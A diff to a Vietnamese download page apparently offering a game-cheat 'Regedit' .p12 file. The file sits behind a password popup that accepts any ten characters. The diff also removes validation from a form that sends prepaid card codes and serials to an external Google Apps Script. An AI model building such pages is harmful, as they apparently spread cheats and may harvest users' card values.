@@ -109,6 +109,36 @@
       color: #555;
     }
 
+    /* Popup mật khẩu */
+    #popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.5);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #popup-content {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      max-width: 90%;
+      width: 300px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      text-align: center;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
     /* Tuyết */
     .snowflake {
       position: fixed;
@@ -121,14 +151,8 @@
     }
 
     @keyframes fall {
-      0% {
-        transform: translateY(0) translateX(0);
-        opacity: 1;
-      }
-      100% {
-        transform: translateY(100vh) translateX(30px);
-        opacity: 0;
-      }
+      0% { transform: translateY(0) translateX(0); opacity: 1; }
+      100% { transform: translateY(100vh) translateX(30px); opacity: 0; }
     }
   </style>
 </head>
@@ -139,13 +163,13 @@
 <section class="app-grid">
   <div class="app-card">
     <h3>Regedit V1</h3>
-    <p>Chức năng: Tăng nhạy, Aim Fov,...</p>
-    <button onclick="taiRegedit()">Tải về</button>
+    <p>Chức năng: Tăng nhạy, Aim Fov, ...</p>
+    <button onclick="showPopup()">Tải về</button>
   </div>
 
   <div class="app-card">
     <h3>Ứng dụng 2</h3>
-    <p>Phần mềm tiện ích khác.</p>
+    <p>Đạt.</p>
     <a href="https://example.com/download2" target="_blank">Tải về</a>
   </div>
 </section>
@@ -168,40 +192,50 @@
   <div class="status" id="thongbao"></div>
 </div>
 
-<!-- Footer -->
+<!-- BIO -->
 <footer>
   © 2025 Kho Ứng Dụng - Phát triển bởi Bạn
 </footer>
 
-<!-- Script tải Regedit -->
+<!-- Popup -->
+<div id="popup">
+  <div id="popup-content">
+    <h3>🔐 Nhập mật khẩu</h3>
+    <input type="text" id="passwordInput" placeholder="10 ký tự..." />
+    <button onclick="xacNhanMatKhau()">Xác nhận</button>
+    <button onclick="hidePopup()" style="background:#e74c3c; margin-top:10px;">Đóng</button>
+    <div id="popup-error" style="color:red; margin-top:10px;"></div>
+  </div>
+</div>
+
+<!-- Script -->
 <script>
-  function taiRegedit() {
-    const password = prompt("🔐 Nhập mật khẩu để tải:");
-    if (password && password.length === 10) {
+  function showPopup() {
+    document.getElementById("popup").style.display = "flex";
+    document.getElementById("popup-error").textContent = "";
+    document.getElementById("passwordInput").value = "";
+  }
+
+  function hidePopup() {
+    document.getElementById("popup").style.display = "none";
+  }
+
+  function xacNhanMatKhau() {
+    const pw = document.getElementById("passwordInput").value.trim();
+    if (pw.length === 10) {
       window.open("https://www.mediafire.com/file/9vdxwukqjytifsv/Super_Config%E2%9A%A1%EF%B8%8F.p12/file", "_blank");
+      hidePopup();
     } else {
-      alert("❌ Sai mật khẩu hoặc mật khẩu không đúng 10 ký tự!");
+      document.getElementById("popup-error").textContent = "❌ Mật khẩu phải đúng 10 ký tự!";
     }
   }
-</script>
 
-<!-- Script Gửi Nạp Thẻ -->
-<script>
+  // Gửi dữ liệu nạp thẻ
   document.getElementById("napthe-form").addEventListener("submit", async function(e) {
     e.preventDefault();
     const formData = new FormData(this);
     const data = Object.fromEntries(formData.entries());
     const thongbao = document.getElementById("thongbao");
-
-    // Kiểm tra đầu vào cơ bản
-    if (isNaN(data.menhgia) || data.mathe.length < 10 || data.seri.length < 10) {
-      thongbao.style.color = "red";
-      thongbao.textContent = "❌ Dữ liệu không hợp lệ!";
-      return;
-    }
-
-    thongbao.style.color = "blue";
-    thongbao.textContent = "⏳ Đang xử lý...";
 
     try {
       const res = await fetch("https://script.google.com/macros/s/AKfycbz2CuuS2m8-Z2LNAgg1ivx8n4AOednxgWA-TXd3iqTNxSzF3GkZ9-NvNQNqFkmAvaZKWw/exec", {
@@ -219,10 +253,8 @@
       thongbao.textContent = "❌ Lỗi khi gửi dữ liệu.";
     }
   });
-</script>
 
-<!-- Hiệu ứng tuyết nhẹ -->
-<script>
+  // Hiệu ứng tuyết
   function createSnowflake() {
     const snowflake = document.createElement("div");
     snowflake.className = "snowflake";
@@ -234,7 +266,7 @@
     document.body.appendChild(snowflake);
     setTimeout(() => snowflake.remove(), 10000);
   }
-  setInterval(createSnowflake, 1000); // Tuyết nhẹ hơn
+  setInterval(createSnowflake, 700);
 </script>
 
 </body>
